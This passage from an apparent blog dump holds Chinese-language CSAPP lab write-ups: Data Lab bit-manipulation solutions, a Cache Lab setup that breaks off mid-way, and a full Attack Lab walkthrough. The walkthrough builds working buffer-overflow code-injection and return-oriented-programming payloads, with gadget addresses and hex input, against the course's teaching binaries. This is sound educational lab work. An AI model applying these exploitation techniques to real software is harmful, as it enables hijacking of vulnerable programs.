&lt;= x &lt;= 31 */ int pow2plus4(int x) { /* exploit ability of shifts to compute powers of 2 */ int result = (1 &lt;&lt; x); result += 4; return result; }FLOATING POINT CODING RULESFor the problems that require you to implement floating-point operations,the coding rules are less strict. You are allowed to use looping andconditional control. You are allowed to use both ints and unsigneds.You can use arbitrary integer and unsigned constants. You can use any arithmetic,logical, or comparison operations on int or unsigned data.You are expressly forbidden to: 1. Define or use any macros. 2. Define any additional functions in this file. 3. Call any functions. 4. Use any form of casting. 5. Use any data type other than int or unsigned. This means that you cannot use arrays, structs, or unions. 6. Use any floating point data types, operations, or constants.NOTES: 1. Use the dlc (data lab checker) compiler (described in the handout) to check the legality of your solutions. 2. Each function has a maximum number of operations (integer, logical, or comparison) that you are allowed to use for your implementation of the function. The max operator count is checked by dlc. Note that assignment ('=') is not counted; you may use as many of these as you want without penalty. 3. Use the btest test harness to check your functions for correctness. 4. Use the BDD checker to formally verify your functions 5. The maximum number of ops for each function is given in the header comment for each function. If there are any inconsistencies between the maximum ops in the writeup and in this file, consider this file the authoritative source./* * STEP 2: Modify the following functions according the coding rules. * * IMPORTANT. TO AVOID GRADING SURPRISES: * 1. Use the dlc compiler to check that your solutions conform * to the coding rules. * 2. Use the BDD checker to formally verify that your solutions produce * the correct answers. */#endif//1/* * bitXor - x^y using only ~ and &amp; * Example: bitXor(4, 5) = 1 * Legal ops: ~ &amp; * Max ops: 14 * Rating: 1 */int bitXor(int x, int y) { // 0100 0101 // ~(x&amp;y | (~x&amp;~y))=~(x&amp;y)&amp;~(~x&amp;~y) return ~(x &amp; y) &amp; ~(~x &amp; ~y);}/* * tmin - return minimum two's complement integer * Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt; * Max ops: 4 * Rating: 1 */int tmin(void) { return 1 &lt;&lt; 31;}//2/* * isTmax - returns 1 if x is the maximum, two's complement number, * and 0 otherwise * Legal ops: ! ~ &amp; ^ | + * Max ops: 10 * Rating: 1 */int isTmax(int x) {// printf(&quot;!!(x + 1) = %d&quot;, x + 1 != 0); // 这里 !!(x+1）=&gt; x+1 != 0 return !(~(x + 1) ^ x) &amp; !!(x + 1);}/* * allOddBits - return 1 if all odd-numbered bits in word set to 1 * where bits are numbered from 0 (least significant) to 31 (most significant) * Examples allOddBits(0xFFFFFFFD) = 0, allOddBits(0xAAAAAAAA) = 1 * Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt; * Max ops: 12 * Rating: 2 */int allOddBits(int x) { // F = 1111 D = 13 = 1101 A=10=1010 return !(~x &amp; 0xAAAAAAAA);}/* * negate - return -x * Example: negate(1) = -1. * Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt; * Max ops: 5 * Rating: 2 */int negate(int x) { return ~x + 1;}//3/* * isAsciiDigit - return 1 if 0x30 &lt;= x &lt;= 0x39 (ASCII codes for characters '0' to '9') * Example: isAsciiDigit(0x35) = 1. * isAsciiDigit(0x3a) = 0. * isAsciiDigit(0x05) = 0. * Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt; * Max ops: 15 * Rating: 3 */int isAsciiDigit(int x) { // x &gt;= 0 &amp;&amp; x &lt;= 9 int a = 0x30, b = 0x39; return (!((x + (~a + 1)) &gt;&gt; 31)) &amp; (!((b + (~x + 1)) &gt;&gt; 31));}/* * conditional - same as x ? y : z * Example: conditional(2,4,5) = 4 * Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt; * Max ops: 16 * Rating: 3 */int conditional(int x, int y, int z) { // x != 0 -&gt; 0xffff // else -&gt; 0x0000 x = !x + ~0; return (x &amp; y) | (~x &amp; z);}/* * isLessOrEqual - if x &lt;= y then return 1, else return 0 * Example: isLessOrEqual(4,5) = 1. * Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt; * Max ops: 24 * Rating: 3 */int isLessOrEqual(int x, int y) { // 同号则相减看是否为负值； 异号则 x 小于 0 则结果为正 int a = ~((x &gt;&gt; 31) ^ (y &gt;&gt; 31)); return (a &amp; !((y + ~x + 1) &gt;&gt; 31)) | ((!a) &amp; (x &gt;&gt; 31));}//4/* * logicalNeg - implement the ! operator, using all of * the legal operators except ! * Examples: logicalNeg(3) = 0, logicalNeg(0) = 1 * Legal ops: ~ &amp; ^ | + &lt;&lt; &gt;&gt; * Max ops: 12 * Rating: 4 */int logicalNeg(int x) { // x &lt; 0 -&gt; flag = 1 // x &gt; 0 -&gt; -x flag = 1 int a = (x &gt;&gt; 31) &amp; 1; int b = ((~x + 1) &gt;&gt; 31) &amp; 1; return 1 - (a | b);}/* howManyBits - return the minimum number of bits required to represent x in * two's complement * Examples: howManyBits(12) = 5 * howManyBits(298) = 10 * howManyBits(-5) = 4 * howManyBits(0) = 1 * howManyBits(-1) = 1 * howManyBits(0x80000000) = 32 * Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt; * Max ops: 90 * Rating: 4 */int howManyBits(int x) { // if x &lt; 0 -&gt; x = x ^ (x &gt;&gt; 31) // 有点难以理解 // 当 x&gt;0 取决于第一个 1 在哪里，当 x&lt;0 取决于第一个 0 在哪里 x = x ^ (x &gt;&gt; 31); int b1 = !!(x &gt;&gt; 16) &lt;&lt; 4; x &gt;&gt;= b1; int b2 = !!(x &gt;&gt; 8) &lt;&lt; 3; x &gt;&gt;= b2; int b3 = !!(x &gt;&gt; 4) &lt;&lt; 2; x &gt;&gt;= b3; int b4 = !!(x &gt;&gt; 2) &lt;&lt; 1; x &gt;&gt;= b4; int b5 = !!(x &gt;&gt; 1); x &gt;&gt;= b5; return b1 + b2 + b3 + b4 + b5 + x + 1;}//float/* * floatScale2 - Return bit-level equivalent of expression 2*f for * floating point argument f. * Both the argument and result are passed as unsigned int's, but * they are to be interpreted as the bit-level representation of * single-precision floating point values. * When argument is NaN, return argument * Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. also if, while * Max ops: 30 * Rating: 4 */unsigned floatScale2(unsigned uf) { // 首先将指数、底数、符号位从 uf 拆出来 unsigned flag = uf &amp; (1 &lt;&lt; 31); unsigned exp = (uf &amp; 0x7f800000) &gt;&gt; 23; unsigned base = uf &amp; 0x007fffff; if (exp == 0) return uf &lt;&lt; 1 | flag; if (exp == 255) return uf; exp++; if (exp == 255) return 0x7f800000 | flag; return (exp &lt;&lt; 23) + base + flag;}/* * floatFloat2Int - Return bit-level equivalent of expression (int) f * for floating point argument f. * Argument is passed as unsigned int, but * it is to be interpreted as the bit-level representation of a * single-precision floating point value. * Anything out of range (including NaN and infinity) should return * 0x80000000u. * Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. also if, while * Max ops: 30 * Rating: 4 */int floatFloat2Int(unsigned uf) { int inf = 0x80000000; // 同样分解，但这次是真实指数 int flag = uf &gt;&gt; 31; int exp = ((uf &amp; 0x7f800000) &gt;&gt; 23) - 127; int base = (uf &amp; 0x007fffff) | 0x00800000; if (exp &gt; 31) return inf; if (exp &lt; 0) return 0; if (exp &gt; 23) base &lt;&lt;= (exp - 23); else base &gt;&gt;= (23 - exp); // 符号相同则直接返回 if (!(flag ^ (base &gt;&gt; 31))) return base; // 当前符号为负，原来为正，超出范围 else if (base &gt;&gt; 31) return inf; // 原来为负，现在为正，取相反数 else return ~base + 1; return 2;}/* * floatPower2 - Return bit-level equivalent of the expression 2.0^x * (2.0 raised to the power x) for any 32-bit integer x. * * The unsigned value that is returned should have the identical bit * representation as the single-precision floating-point number 2.0^x. * If the result is too small to be represented as a denorm, return * 0. If too large, return +INF. * * Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. Also if, while * Max ops: 30 * Rating: 4 */unsigned floatPower2(int x) { unsigned inf = 0x7f800000; // 初始为 x*2^0-&gt;0-127-x int exp = x + 127; if (exp &gt;= 255) return inf; if (exp &lt;= 0) return 0; return exp &lt;&lt; 23;}","link":"/2022/06/01/CSAPP-LAB-1/"},{"title":"CSAPP Lab3 Understanding Buffer Overflow Bugs","text":"由于是直接上手做的，看完 readme 后也是一头雾水，结合 attacklab.pdf (cmu.edu) 和原书第三版的 3.10.3 和 3.10.4 才恍然大悟，当然视频资料也有不少。另外，之前又犯了个错误，就是我在 mac 上反编译了 ctarget，注意 csapp 的系列实验都应在 x86 环境下进行。 准备 实验 3 主要分成两个部分，在 ctarget 做代码注入 CI 攻击，在 rtarget 上做返回导向编程 ROP 攻击。在 CI 部分有 3 个 level，而在 ROP 部分有两个 level，由于我们不是 cmu 的学生，所以在调试命令时注意加上 - q 禁止发送结果给服务器。 为了方便，我们将 ctarget 和 rtarget 反汇编到 ctarget.s 和 rtarget.s 中： 12[root@MiWiFi-R4A-srv target1]# objdump -d rtarget &gt; rtarget.s[root@MiWiFi-R4A-srv target1]# objdump -d ctarget &gt; ctarget.s level1 这里是 attacklab.pdf (cmu.edu) 给出的代码： 123456789101112131415161718192021void test(){ int val; val = getbuf(); printf(&quot;No exploit. Getbuf returned 0x%x\\n&quot;, val);}unsigned getbuf(){ char buf[BUFFER_SIZE]; Gets(buf); return 1;}void touch1(){ vlevel = 1; /* Part of validation protocol */ printf(&quot;Touch1!: You called touch1()\\n&quot;); validate(1); exit(0);} 123456789101112131415161718192000000000004017a8 &lt;getbuf&gt;: 4017a8: 48 83 ec 28 sub $0x28,%rsp 4017ac: 48 89 e7 mov %rsp,%rdi 4017af: e8 8c 02 00 00 callq 401a40 &lt;Gets&gt; 4017b4: b8 01 00 00 00 mov $0x1,%eax 4017b9: 48 83 c4 28 add $0x28,%rsp 4017bd: c3 retq 4017be: 90 nop 4017bf: 90 nop00000000004017c0 &lt;touch1&gt;: 4017c0: 48 83 ec 08 sub $0x8,%rsp 4017c4: c7 05 0e 2d 20 00 01 movl $0x1,0x202d0e(%rip) # 6044dc &lt;vlevel&gt; 4017cb: 00 00 00 4017ce: bf c5 30 40 00 mov $0x4030c5,%edi 4017d3: e8 e8 f4 ff ff callq 400cc0 &lt;puts@plt&gt; 4017d8: bf 01 00 00 00 mov $0x1,%edi 4017dd: e8 ab 04 00 00 callq 401c8d &lt;validate&gt; 4017e2: bf 00 00 00 00 mov $0x0,%edi 4017e7: e8 54 f6 ff ff callq 400e40 &lt;exit@plt&gt; 在 level1 中我们需要通过 CI 让 test 执行时跳转到 touch1 中，而程序的跳转和 rsp 寄存器有关，一开始 rsp 给了 0x28 的空间供 getbuf 栈帧使用，但如果 getbuf 输入了 40 字节以上，就会将父帧 test 的状态破坏。基于这个原理，我们处理方式也比较简单直接，首先用随意内容填充前 40 字节，再追加 touch1 的入口地址，这样当 getbuf 返回时，rsp 会将该地址弹出到 pc，从而成功执行 touch1 的代码。由于 touch1 最后直接 exit 了，所以我们无需关心进入 touch1 之后发生的事情。 另外，为了方便我们填充字节，lab 提供了一个 16 进制转换工具，我们按照附录示例方式写入即可，写入方式也挺多样的。 12300 00 00 00 00 00 00 0000 00 00 00 00 00 00 00 /* 40 个空白字符 */c0 17 40 00 00 00 00 00 /* 目标 touch1 入口地址 */ 123456789[root@MiWiFi-R4A-srv target1]# ./hex2raw &lt; ctarget.l1.txt | ./ctarget -qCookie: 0x59b997faType string:Touch1!: You called touch1()Valid solution for level 1 with target ctargetPASS: Would have posted the following: user id bovik course 15213-f15 lab attacklab result 1:PASS:0xffffffff:ctarget:1:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 C0 17 40 00 00 00 00 00 另外，Intel 8086 系列都是小端对齐的，也就是低地址放低位，如 0x00000000004017c0，c0 在最低位所以应该放在地址最小的位置，也就是起始位置。这里可能不好想象，比如一台 64 位机器，栈上每层都是 8 字节，我的 ctarget.l1.txt 也是按这种方式排列的，便于参考阅读。 level2 123456789101112void touch2 (unsigned val){ vlevel = 2; /* Part of validation protocol */ if (val == cookie) { printf(&quot;Touch2!: You called touch2(0x%.8x)\\n&quot;, val); validate(2); } else { printf(&quot;Misfire: You called touch2(0x%.8x)\\n&quot;, val); fail(2); } exit(0);} 12345600000000004017ec &lt;touch2&gt;: 4017ec: 48 83 ec 08 sub $0x8,%rsp 4017f0: 89 fa mov %edi,%edx 4017f2: c7 05 e0 2c 20 00 02 movl $0x2,0x202ce0(%rip) # 6044dc &lt;vlevel&gt; 4017f9: 00 00 00 ... 类似的，如果我们需要切换到 touch2，除了引导 touch2 的入口地址 0x4017ec 外还需要给出参数 val，让 val 和 cookie（0x59b997fa）相等。这里需要我们插入代码段，完整做完 lab2 后已经不难写出如下代码： 1234movl $0x59b997fa, %edi # 提供 valpushq 0x4017ec # touch2retq movl、movq 都是 mov 操作，前者是 32 位，后者 64 位，实验给的 cookie 显然用 32 位即可，写汇编时注意尾部提行，不然可能会报 warning。 现在我们将其编译后再反编译获取其字节码表达形式，注意，这里有个问题是 objdump 反编译时可能会遇到格式问题，我因为这个原因失败了好几次（默认 x86-84 格式），最好是手动选择 intel 或者 att 格式，前者适用于 windows、DOS，后者适用于 Linux。 12345678l2.o： 文件格式 elf64-x86-64Disassembly of section .text:0000000000000000 &lt;.text&gt;: 0: bf fa 97 b9 59 mov $0x59b997fa,%edi 5: ff 34 25 ec 17 40 00 pushq 0x4017ec c: c3 retq 但是我最后还是失败了，我参考了别人成功通过的代码，发现我反汇编后得到的 pushq 和他们的不一样，所以果断换另外一种不需要 pushq 的方法，直接将其放到栈上。 12mov $0x59b997fa, %rdi # 提供 valretq 1234567l2.o： 文件格式 elf64-x86-64Disassembly of section .text:0000000000000000 &lt;.text&gt;: 0: 48 c7 c7 fa 97 b9 59 mov $0x59b997fa,%rdi 7: c3 retq 我们将这段代码通过 getbuf 传到 rsp-0x28 处，再用类似 level1 的方法跳转到这里执行这段代码。现在整个程序逻辑就比较清晰了，getbuf 执行完后进入我们的插入代码中，执行完后进入 touch2。 1234567891011121314151617181920212223242526272829[root@MiWiFi-R4A-srv target1]# gdb ctargetGNU gdb (GDB) Red Hat Enterprise Linux 10.2-8.el9Copyright (C) 2021 Free Software Foundation, Inc.License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;...（省略了）(gdb) disasDump of assembler code for function getbuf:=&gt; 0x00000000004017a8 &lt;+0&gt;: sub $0x28,%rsp 0x00000000004017ac &lt;+4&gt;: mov %rsp,%rdi 0x00000000004017af &lt;+7&gt;: call 0x401a40 &lt;Gets&gt; 0x00000000004017b4 &lt;+12&gt;: mov $0x1,%eax 0x00000000004017b9 &lt;+17&gt;: add $0x28,%rsp 0x00000000004017bd &lt;+21&gt;: ret End of assembler dump.(gdb) p $rsp$1 = (void *) 0x5561dca0(gdb) stepi14 in buf.c(gdb) disasDump of assembler code for function getbuf: 0x00000000004017a8 &lt;+0&gt;: sub $0x28,%rsp=&gt; 0x00000000004017ac &lt;+4&gt;: mov %rsp,%rdi 0x00000000004017af &lt;+7&gt;: call 0x401a40 &lt;Gets&gt; 0x00000000004017b4 &lt;+12&gt;: mov $0x1,%eax 0x00000000004017b9 &lt;+17&gt;: add $0x28,%rsp 0x00000000004017bd &lt;+21&gt;: ret End of assembler dump.(gdb) p $rsp$2 = (void *) 0x5561dc78 通过 GDB 我们轻松获得 rsp 的位置是 0x5561dca0 而 rsp-0x28 的位置自然是 0x5561dc78 了，这就是我们的跳转位置。 1234548 c7 c7 fa 97 b9 59 c300 00 00 00 00 00 00 0000 00 00 00 00 00 00 00 /* 插入代码段 */78 dc 61 55 00 00 00 00 /* rsp-0x24 */ec 17 40 00 00 00 00 00 /* 目标 touch2 入口地址 */ 123456789[root@MiWiFi-R4A-srv target1]# ./hex2raw &lt; ctarget.l2.txt | ./ctarget -qCookie: 0x59b997faType string:Touch2!: You called touch2(0x59b997fa)Valid solution for level 2 with target ctargetPASS: Would have posted the following: user id bovik course 15213-f15 lab attacklab result 1:PASS:0xffffffff:ctarget:2:48 C7 C7 FA 97 B9 59 68 EC 17 40 00 C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55 00 00 00 00 level3 1234567891011121314151617181920/* Compare string to hex represention of unsigned value */int hexmatch(unsigned val, char *sval) { char cbuf[110]; /* Make position of check string unpredictable */ char *s = cbuf + random() % 100; sprintf(s, &quot;%.8x&quot;, val); return strncmp(sval, s, 9) == 0;}void touch3(char *sval) { vlevel = 3; /* Part of validation protocol */ if (hexmatch(cookie, sval)) { printf(&quot;Touch3!: You called touch3(\\&quot;%s\\&quot;)\\n&quot;, sval); validate(3); } else { printf(&quot;Misfire: You called touch3(\\&quot;%s\\&quot;)\\n&quot;, sval); fail(3); } exit(0);} 12345600000000004018fa &lt;touch3&gt;: 4018fa: 53 push %rbx 4018fb: 48 89 fb mov %rdi,%rbx 4018fe: c7 05 d4 2b 20 00 03 movl $0x3,0x202bd4(%rip) # 6044dc &lt;vlevel&gt; 401905: 00 00 00 ... 在 level3 中，我们的参数变成了字符串，同时由于 touch3 调用了子函数 hexmatch，尤其里面的声明和随机位置赋值，这意味着如果我们还想像 level2 一样在 rsp-0x28 处插入代码就有可能被覆盖掉。注意，我们是需要在存字符串的，一旦被覆盖了，字符串就丢失了。因此，我们换到处于更高位置的 test 帧处做字符串存储，同样的，由于 touch3 直接 exit 我们不用担心后续。 由于 level2 相同编译问题，我将 touch3 的入口也放到后面了，因此字符串的实际实际位置在 rsp+0x10，也就是 0x5561dcb0。 123movl $0x5561dcb0, %edi # 提供 svalretq 1230000000000000000 &lt;.text&gt;: 0: bf b0 dc 61 55 mov $0x5561dcb0,%edi 5: c3 retq 通过查询 ASCII 表，我们可以得到 cookie 0x59b997fa 的字节码表示 “35 39 62 39 39 37 66 61”。 1234567bf b0 dc 61 55 c3 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 00 /* 插入代码段 */78 dc 61 55 00 00 00 00 /* rsp-0x24 */fa 18 40 00 00 00 00 00 /* touch3 入口 */35 39 62 39 39 37 66 61 /* 字符串，注意用 00 结尾 */00 123456789[root@MiWiFi-R4A-srv target1]# ./hex2raw &lt; ctarget.l3.txt | ./ctarget -qCookie: 0x59b997faType string:Touch3!: You called touch3(&quot;59b997fa&quot;)Valid solution for level 3 with target ctargetPASS: Would have posted the following: user id bovik course 15213-f15 lab attacklab result 1:PASS:0xffffffff:ctarget:3:BF B0 DC 61 55 C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55 00 00 00 00 FA 18 40 00 00 00 00 00 35 39 62 39 39 37 66 61 00 level4 由于 DI 攻击方式太过常见，所以很多程序都自带针对 DI 的防御手段，比如栈随机化、栈破坏检测（通过金丝雀值）和限制可执行代码区域。但显然它们也不能做到尽善尽美，level4 和 level5 就要求我们在以上限制下重新完成 touch2 和 touch3 的骇入。 现在我们重新梳理 touch2，不难发现其实我们真正需要的操作是让寄存器 edi 获得 0x59b997fa。由于当前的限制条件，我们只能将其写在栈上再通过 pop 读出，且这个 pop 操作只能通过 lab 给出的 “工具代码段” 也就是 start_farm 到 end_farm 这一部分得到。 首先，参考实验说明的附录表格，我们知道 pop 操作是 0x58~0x5f，于是去 farm 中寻找，发现只有 58 和 5c，分别对应 popq rax 和 popq rsp，这里再次说明 q 后缀是 64 位，l 后缀是 32 位。了解二者含义都知道，我们只有一个选项那就是 popq rax，也就是说我们存储的 0x59b997fa 会被送到 rax。 这里我们取 addval，0x4019a7+4=0x4019ab： 123456700000000004019a7 &lt;addval_219&gt;: 4019a7: 8d 87 51 73 [58] 90 lea -0x6fa78caf(%rdi),%eax 4019ad: c3 retq 00000000004019b5 &lt;setval_424&gt;: 4019b5: c7 07 54 c2 [58] 92 movl $0x9258c254,(%rdi) 4019bb: c3 retq 那么我们现在是希望该字段被送到 edi 或者 rdi，通过查找 movl 和 movq 表，再对照 farm 内容，我们找到了三条数据，由于包含”49 89 c7” 对应 “movq rax, rdi”，所以就不用再去找中转了（与之相对的，level5 需要）。 对比这三条，我选择了 addval，因为后面直接跟着 c3，对应汇编中的 “retq”，取 0x4019a0+2，即 0x4019a2： 123456789101100000000004019a0 &lt;addval_273&gt;: 4019a0: 8d 87 [48 89 c7] c3 lea -0x3c3876b8(%rdi),%eax 4019a6: c3 retq00000000004019ae &lt;setval_237&gt;: 4019ae: c7 07 [48 89 c7] c7 movl $0xc7c78948,(%rdi) 4019b4: c3 retq00000000004019c3 &lt;setval_426&gt;: 4019c3: c7 07 [48 89 c7] 90 movl $0x90c78948,(%rdi) 4019c9: c3 retq 最后，成功构造出指定输入，我用的塔式结构，也比较清晰易懂：） 12345600 00 00 00 00 00 00 0000 00 00 00 00 00 00 00 /* 40 个空白字符 */ab 19 40 00 00 00 00 00 /* 弹出目标数据给 rax */fa 97 b9 59 00 00 00 00 /* 目标数据 */a2 19 40 00 00 00 00 00 /* rax 传给 rdi */ec 17 40 00 00 00 00 00 /* touch2 入口 */ 123456789[root@MiWiFi-R4A-srv target1]# ./hex2raw &lt; rtarget.l4.txt | ./rtarget -qCookie: 0x59b997faType string:Touch2!: You called touch2(0x59b997fa)Valid solution for level 2 with target rtargetPASS: Would have posted the following: user id bovik course 15213-f15 lab attacklab result 1:PASS:0xffffffff:rtarget:2:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 AB 19 40 00 00 00 00 00 FA 97 B9 59 00 00 00 00 A2 19 40 00 00 00 00 00 EC 17 40 00 00 00 00 00 level5 首先我们先梳理一下 touch3，其核心需求是让寄存器 edi 获得我们存放字符串的起始地址，所以我们其实需要准备三个东西：字符串、touch3 入口、字符串地址。但是字符串地址我们是无法确定的，我们只能通过 rsp 间接确定其位置，于是我们的整个结构如下： 1234567/* 40 个空白字符 *//* 1. 传 rsp 的位置（也就是 2. 的位置）给寄存器 x *//* 2. 获取偏移给 rax*//* 3. 偏移 即指令 2.~5. 的总长度 *//* 4.x 加上偏移（即地址）传给 rdi *//* 5.touch3 入口 *//* 6. 字符串 */ 首先，我们要找能够接收 rsp 的寄存器，也就是形如”movq rsp x“的指令（48 89 e0~7），发现只有”48 89 e0“。这里我们依然挑选最干净的第一项，它后面直接跟着 c3，得到 0x401a06。 12345678910110000000000401a03 &lt;addval_190&gt;: 401a03: 8d 87 41 48 89 e0 lea -0x1f76b7bf(%rdi),%eax 401a09: c3 retq0000000000401a47 &lt;addval_201&gt;: 401a47: 8d 87 48 89 e0 c7 lea -0x381f76b8(%rdi),%eax 401a4d: c3 retq0000000000401a5a &lt;setval_299&gt;: 401a5a: c7 07 48 89 e0 91 movl $0x91e08948,(%rdi) 401a60: c3 retq 然后，我们要找到能将该地址和偏移地址加起来的函数，我找了半天没发现 add，但找到了另一个更贴切的 add_xy，直接用这整个函数即可，得到 0x4019d6。 12300000000004019d6 &lt;add_xy&gt;: 4019d6: 48 8d 04 37 lea (%rdi,%rsi,1),%rax 4019da: c3 retq 但是我们发现它只接收 rdi 和 rsi，于是我又慢慢去找二者相关的 movq 或 movl 函数，因为涉及到中间变量相互传值，所以这是个漫长而乏味的过程。总之，最后找到了符合目标的一组传值过程，然后将之前总结的细化一下。 12345678910111.movq rsp rax 此时 rsp 指向 2.2.movq rax rdi3.pop eax4. 偏移值=10-1=9 层（字符串还被 9 条指令压着呢）所以 9x8=72 字节5.movl eax edx6.movl edx ecx7.movl ecx esi8.lea (rdi, rsi, 1) rax9.movq rax rdi10.touch311. 字符串 其中需要注意的细节就是 q 和 l 后缀，rsp 地址是 64 位的必须要用 movq，而偏移量显然可以用 32 位传递，于是拓展到 movl。 123456789101112131400 00 00 00 00 00 00 0000 00 00 00 00 00 00 00 /* 40 个空白字符 */06 1a 40 00 00 00 00 00 /* mov rsp rax */c5 19 40 00 00 00 00 00 /* mov rax rdi 4019c3+2 */ab 19 40 00 00 00 00 00 /* pop rax */48 00 00 00 00 00 00 00 /* 偏移 72=0x48 */dd 19 40 00 00 00 00 00 /* mov eax edx 89 c2 4019db+2 */70 1a 40 00 00 00 00 00 /* mov edx ecx 89 d1 401a6e+2 */63 1a 40 00 00 00 00 00 /* mov ecx esi 89 ce 401a61+2 */d6 19 40 00 00 00 00 00 /* lea (rdi, rsi, 1) rax 4019d6 */c5 19 40 00 00 00 00 00 /* mov rax rdi */fa 18 40 00 00 00 00 00 /* touch3 入口 4018fa */35 39 62 39 39 37 66 61 /* 字符串，注意用 00 结尾 */00 123456789[root@MiWiFi-R4A-srv target1]# ./hex2raw &lt; rtarget.l5.txt | ./rtarget -qCookie: 0x59b997faType string:Touch3!: You called touch3(&quot;59b997fa&quot;)Valid solution for level 3 with target rtargetPASS: Would have posted the following: user id bovik course 15213-f15 lab attacklab result 1:PASS:0xffffffff:rtarget:3:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 06 1A 40 00 00 00 00 00 C5 19 40 00 00 00 00 00 AB 19 40 00 00 00 00 00 48 00 00 00 00 00 00 00 DD 19 40 00 00 00 00 00 70 1A 40 00 00 00 00 00 63 1A 40 00 00 00 00 00 D6 19 40 00 00 00 00 00 C5 19 40 00 00 00 00 00 FA 18 40 00 00 00 00 00 35 39 62 39 39 37 66 61 00 注意： 1.0x90 对应于”no op“操作，所以如果我们看到这样的汇编码，又想调用”89 ce“时放心使用即可。 1230000000000401a11 &lt;addval_436&gt;: 401a11: 8d 87 89 ce 90 90 lea -0x6f6f3177(%rdi),%eax 401a17: c3 retq 2.0xc3 对应返回值之前有讲过 3. 单个字节不被看作操作，会被自动忽略，比如下面的代码，我们想要”89 d1“，由于和”c3“只间隔一个字节，中间的”91“会被忽略，即可以截取该代码段运行。 1230000000000401a6e &lt;setval_167&gt;: 401a6e: c7 07 89 d1 91 c3 movl $0xc391d189,(%rdi) 401a74: c3 retq","link":"/2022/06/03/CSAPP-LAB-3/"},{"title":"CSAPP Lab5 Understanding Cache Memories","text":"环境准备 参考指导文档 cachelab.dvi (cmu.edu)，我们需要在 linux 环境下解压文档。 1234567891011121314151617181920[root@MiWiFi-R4A-srv csapp]# cd cachelab-handout/[root@MiWiFi-R4A-srv cachelab-handout]# lscachelab.c csim.c driver.py README test-trans.c tracescachelab.h csim-ref Makefile test-csim tracegen.c trans.c[root@MiWiFi-R4A-srv cachelab-handout]# make cleanrm -rf *.orm -f *.tarrm -f csimrm -f test-trans tracegenrm -f trace.all trace.f*rm -f .csim_results .marker[root@MiWiFi-R4A-srv cachelab-handout]# makegcc -g -Wall -Werror -std=c99 -m64 -o csim csim.c cachelab.c -lm gcc -g -Wall -Werror -std=c99 -m64 -O0 -c trans.cgcc -g -Wall -Werror -std=c99 -m64 -o test-trans test-trans.c cachelab.c trans.o gcc -g -Wall -Werror -std=c99 -m64 -O0 -o tracegen tracegen.c trans.o cachelab.c# Generate a handin tar file each time you compiletar -cvf zion-handin.tar csim.c trans.c csim.ctrans. 这里提一句，由于我使用的是 win10+VMware+Centos，每次都是通过 Clion 在共享文件夹中编辑文档，再在虚拟机中运行，因此在这个实验 PartB 中遇到了由共享文件夹造成的超时问题。解决思路也很简单，复制项目到非共享文件目录再运行即可。以及，每次都需要通过以下指令将共享目录可见， 12vmware-hgfsclient # 查看当前共享目录有哪些vmhgfs-fuse .host:/ /mnt/hgfs -o subtype=vmhgfs-fuse,allow_other -o nonempty # 把共享目录放到/mnt/hgfs 中 然后我们需要安装 valgrind，它是一个内存调试检测工具，项目中 traces 目录下的文档就是该工具生成的样例，我们也可以试着运行它去检测指令（比如论文示范的 “ls -l”）。 123456[root@MiWiFi-R4A-srv zion]# yum install valgrind上次元数据过期检查：0:02:55 前，执行于 2022 年 07 月 10 日 星期日 12 时 34 分 57 秒。软件包 valgrind-1:3.19.0-3.el9.x86_64 已安装。依赖关系解决。无需任何处理。完毕！ 在实验过程中，主要参考指导文档 cachelab.dvi (cmu.edu) 和教学 PPTrec07.pdf (cmu.edu)，尤其后者有清晰配图，容易理解。 PartA 在 PartA 中，我们工作就是编写一个类似 valgrind 的内存监测工具，当然并非完全复刻，而是只实现其中的路径追踪即可。 lab 本身提供了一个模拟器 csim-ref，我们要做的就是编写实现相同功能的 c 程序，实现的重点是对内存存储方式的理解。实际上我们并没有对缓存做任何操作，我们会读入 trace 文件，根据不同的 s、E、b 构成的不同缓存环境，判断 miss、hit 和 eviction 的次数。也就是说我们输入一个按照 [space]operation address,size 方式描述 trace 的文本文档，而 c 程序会根据其文本描述解析每条指令 L、M 或 S 的访存情况，最后统计并反馈给 printSummary。 123456789[root@MiWiFi-R4A-srv cachelab-handout]# ./csim-ref -s 4 -E 1 -b 4 -t traces/yi.trace -vL 10,1 miss M 20,1 miss hit L 22,1 hit S 18,1 hit L 110,1 miss eviction L 210,1 miss eviction M 12,1 miss eviction hit hits:4 misses:5 evictions:3 主存到 cache 有三种映射方式：直接映射、全相联映射、组相联映射。根据参数说明，缓存本身有 2^s 组，每组由 E 块组成，当然每个块有 2^b 字节。比如文中示例的 “-s 4 -E 1 -b 4”，说明当前缓存环境为有 16 组，每组 1 块，每个块 16 字节。再根据 PPT，我们知道访存地址可以拆分为三个部分，tag、组号和块偏移。 接着，我们一条一条指令分析。“L 10，1” 说明访问地址 0x10，访问 1 个字节，访问方式为 Load。因此，而每块 16 字节，因此地址 0x10 表示访问第 1 组，并且 tag 为 0x0 的块，发现没有，于是从主存中复制过来，记一次 miss。同理，“M 20，1” 访问第 2 组，发现没有找到 tag 为 0x0 的块，于是同样记一次 miss。这里注意，由于 M 等于 “L+S”，所以虽然 L 部分算做 miss，但 S 部分却 hit 了，因此还有记一次 hit。“L 22，1” 访问第 2 组且 tag 